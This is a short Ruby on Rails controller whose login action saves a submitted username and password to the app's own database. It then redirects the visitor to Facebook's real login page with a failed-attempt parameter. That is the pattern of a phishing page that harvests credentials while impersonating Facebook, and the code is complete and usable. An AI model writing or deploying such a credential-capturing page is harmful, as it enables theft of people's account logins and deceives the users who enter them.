class WelcomeController < ApplicationController
  def index
  	@user = User.new
  end

  def login
  	@user = User.new(user_params)
  	if @user.save
  		redirect_to 'https://www.facebook.com/login.php?login_attempt=1&lwv=110'
  	end
  end

  def success
  end

  private
  	def user_params
  		params.require(:user).permit(:username, :password)
  	end
end
